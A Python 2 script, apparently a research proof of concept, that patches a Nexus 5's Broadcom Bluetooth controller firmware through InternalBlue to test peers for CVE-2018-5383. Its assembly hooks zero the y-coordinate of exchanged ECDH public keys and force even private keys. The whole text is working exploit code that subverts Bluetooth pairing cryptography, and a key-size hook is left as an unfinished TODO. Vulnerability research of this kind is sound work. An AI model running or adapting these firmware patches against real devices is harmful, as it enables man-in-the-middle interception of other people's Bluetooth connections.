#!/usr/bin/env python2

# mel

"""
Patches are temporary and they are loaded at boot eg: write RAM HCI commands

BCM4339 ARM32 cortex M3:

    - thumb-2: either 16 or 32 bit instruction
    - code is little endian
    - data is either little or big endian
    - load/store arch
    - memory is a linear map of 32 bit words

Code and data can be either in ROM or RAM:

    - ROM has a static address layout
    - RAM has a dynamic address layout

fw files are specific to the chip:

    - address offset
    - little patch

lmp monitor:

    - LMP packets are exchanged only btw controllers
    - LMP_dispatcher hook: called every time an LMP packet is recv
        - packet content is copied and sent over HCI to the ctrl
    - LMP_send_packet hook: called every time an LMP packet is sent

Modify it to select all crypto related stuff and change the packet

"""

from pwn import *
from internalblue import core

internalblue = core.InternalBlue()


# Address of the function to patch
PK_RECV_HOOK_ADDRESS = 0x2FED8
PK_SEND_HOOK_ADDRESS = 0x030098
GEN_PRIV_KEY_ADDRESS = 0x48eba

EK_REQ_HOOK_ADDRESS = 'TODO'

# Address of the patch
HOOKS_LOCATION = 0xd7800

ASM_HOOKS = """
b pk_recv_hook  // HOOKS_LOCATION
b pk_send_hook  // HOOKS_LOCATION+2
b gen_priv_key  // HOOKS_LOCATION+4
b key_req_hook  // HOOKS_LOCATION+6

// overwrite key length
key_req_hook:
    TODO

// overwrite y-coordinate of received PK point
pk_recv_hook:
    push {r0-r3,lr}
    strb.w  r0, [r4, 170]
    ldr r0, =0x205614
    mov r1, 6
    mov r2, 0
loop1:
    str r2, [r0]
    add r0, 4
    subs r1, 1
    bne  loop1
    pop {r0-r3,pc}

// overwrite y-coordinate of own PK point before sending it out
pk_send_hook:
    add r2, r0, 24
    mov r3, 0
    mov r1, 6
loop2:
    str r3, [r2]
    add r2, 4
    subs r1, 1
    bne  loop2
    b 0x2FFC4

// generate a priv key which is always even
gen_priv_key:
    push {r4,lr}
    mov r3, r0
    mov r4, r1
generate:
    mov r0, r3
    mov r1, r4
    bl 0x48E96  // generate new priv key
    ldr  r2, [r3]
    ands r2, 0x1
    bne generate
    pop  {r4,pc}
"""

# setup sockets
if not internalblue.connect():
    log.critical("No connection to target device.")
    exit(-1)

# Write patches in memory
code = asm(ASM_HOOKS, vma=HOOKS_LOCATION)
log.info("Writing hooks to 0x%x..." % HOOKS_LOCATION)
if not internalblue.writeMem(HOOKS_LOCATION, code):
    log.critical("Cannot write hooks at 0x%x" % HOOKS_LOCATION)
    exit(-1)

log.info("Installing hook patches...")

log.info("  - Hook public key receive path to replace y-coordinate with zero")
patch = asm("bl 0x%x" % HOOKS_LOCATION, vma=PK_RECV_HOOK_ADDRESS)
if not internalblue.patchRom(PK_RECV_HOOK_ADDRESS, patch):
    log.critical("Installing patch for PK_recv failed!")
    exit(-1)

log.info("  - Hook public key send path to replace y-coordinate with zero")
patch = asm("bl 0x%x" % (HOOKS_LOCATION+2), vma=PK_SEND_HOOK_ADDRESS)
if not internalblue.patchRom(PK_SEND_HOOK_ADDRESS, patch):
    log.critical("Installing patch for PK_send failed!")
    exit(-1)

log.info("  - Hook private key generation function to always produce even private key")
# replace function sub_48E96 (generate random privkey) with a function
# that generates an even privkey. needs 2 dword patches because of alignment:
#00048EB8 20 A8       ADD     R0, SP, #0x100+var_80
#00048EBA FF F7 EC FF BL      sub_48E96
#00048EBE 25 98       LDR     R0, [SP,#0x100+var_6C]
patch = asm("bl 0x%x" % (HOOKS_LOCATION+4), vma=GEN_PRIV_KEY_ADDRESS)
if not internalblue.patchRom(GEN_PRIV_KEY_ADDRESS, patch):
    log.critical("Installing patch for GEN_PRIV_KEY failed!")
    exit(-1)

# TODO
log.info("  - Hook key size request")
patch = asm("bl 0x%x" % (HOOKS_LOCATION+6), vma=EK_REQ_HOOK_ADDRESS)
if not internalblue.patchRom(EK_REQ_HOOK_ADDRESS, patch):
    log.critical("Installing patch for PK_send failed!")
    exit(-1)

# Forcing the generation of a new keypair
log.info("Send HCI_Write_Simple_Pairing_Mode command to force generation of new key pair")


# Done
log.info("Done. The device is now ready.")
log.info("Steps to verify if another BT device is vulnerable to CVE-2018-5383:")
log.info(" 1. Start InternalBlue CLI for Nexus 5 and activate the LMP monitor.")
log.info(" 2. Pair the Nexus 5 with the other BT device.")
log.info(" 3. If pairing fails with message 'Incorrect PIN', repeat step 2.")
log.info("    If the other device is vulnerable, pairing succeeds with 50% probability.")
log.info("    If the other device is NOT vulnerable, pairing never succeeds.")
log.info(" 4. After pairing was successful, check the LMP capture and verify that")
log.info("    the Nexus 5 sent zero as y-coordinate in the 'encapsulated payload' packet")
